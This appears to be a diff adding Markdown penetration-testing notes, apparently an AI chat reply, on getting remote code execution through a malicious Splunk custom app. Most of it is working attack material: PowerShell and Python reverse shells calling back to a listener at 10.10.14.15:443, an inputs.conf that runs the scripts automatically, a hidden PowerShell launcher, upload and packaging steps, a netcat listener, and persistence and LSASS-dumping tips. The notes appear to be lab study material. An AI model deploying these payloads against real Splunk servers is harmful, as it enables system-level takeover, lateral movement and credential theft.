@@ -1461,3 +1461,125 @@ p.destroy();s.close();
   * Runs code and feeds `stdout` as log data
 
 ---
+
+Here are the notes in **Markdown** syntax for **Attacking Splunk via Custom Applications**:
+
+---
+
+# 🛠️ Attacking Splunk via Custom Applications
+
+## 🎯 Objective
+
+Leverage Splunk’s app deployment system to achieve **Remote Code Execution (RCE)** using built-in scripting capabilities such as **Python** or **PowerShell**.
+
+## 🧰 Key Splunk Directory Structure
+
+```
+splunk_shell/
+├── bin              # Contains scripts (PowerShell, Python, etc.)
+└── default          # Contains configuration file (inputs.conf)
+```
+
+## 📜 PowerShell Reverse Shell Example
+
+```powershell
+$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{0};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+  $sendback = (iex $data 2>&1 | Out-String );
+  $sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';
+  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+  $stream.Write($sendbyte,0,$sendbyte.Length);
+  $stream.Flush()
+};
+$client.Close()
+```
+
+## ⚙️ `inputs.conf` Configuration
+
+```ini
+[script://./bin/rev.py]
+disabled = 0
+interval = 10
+sourcetype = shell
+
+[script://.\bin\run.bat]
+disabled = 0
+sourcetype = shell
+interval = 10
+```
+
+## 🖥️ Batch File: `run.bat`
+
+```bat
+@ECHO OFF
+PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
+Exit
+```
+
+## 🧪 Python Reverse Shell (For Linux Targets)
+
+```python
+import sys, socket, os, pty
+
+ip = "10.10.14.15"
+port = "443"
+s = socket.socket()
+s.connect((ip, int(port)))
+[os.dup2(s.fileno(), fd) for fd in (0,1,2)]
+pty.spawn("/bin/bash")
+```
+
+## 📦 Packaging the App
+
+```bash
+tar -cvzf updater.tar.gz splunk_shell/
+```
+
+we created a folder of all the files above and zipped it
+
+## 🚀 Upload the App
+
+Go to:
+
+```
+https://<splunk-host>:8000/en-US/manager/search/apps/local
+```
+
+* Click: `Install app from file`
+* Browse and upload `updater.tar.gz`
+* App auto-enables, triggering reverse shell
+
+## 🧏 Listener Setup
+
+```bash
+sudo nc -lnvp 443
+```
+
+Expected output upon successful connection:
+
+```powershell
+PS C:\Windows\system32> whoami
+nt authority\system
+```
+
+## 🧱 Persistence and Lateral Movement
+
+* If the target is a **deployment server**, place your app in:
+
+  ```
+  $SPLUNK_HOME/etc/deployment-apps/
+  ```
+* Forwarders (especially Windows-based) **do not include Python**, so use **PowerShell** payloads for those.
+
+
+## 🔐 Post-Exploitation Tips
+
+* Enumerate registry, filesystem, memory for credentials
+* Dump LSASS for password hashes
+* Begin Active Directory enumeration
+
+---
+
